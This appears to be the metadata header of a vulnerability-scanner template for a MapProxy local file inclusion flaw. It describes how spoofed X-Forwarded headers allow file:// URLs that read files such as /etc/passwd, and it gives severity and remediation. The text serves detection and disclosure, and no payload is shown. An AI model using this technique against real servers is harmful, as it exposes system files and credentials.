info:
  name: MapProxy - Local File Inclusion
  author: xbow,DhiyaneshDk
  severity: high
  description: |
    MapProxy improperly validates and processes X-Forwarded headers, allowing attackers to construct file:// URLs that bypass access controls and read local files through local file inclusion vulnerability.
  impact: |
    An attacker can exploit this vulnerability to read sensitive local files like /etc/passwd, configuration files, and other system files, potentially exposing sensitive information.
  remediation: |
    Update MapProxy to a patched version that properly validates X-Forwarded headers and restricts file:// URL schemes in proxy configurations.
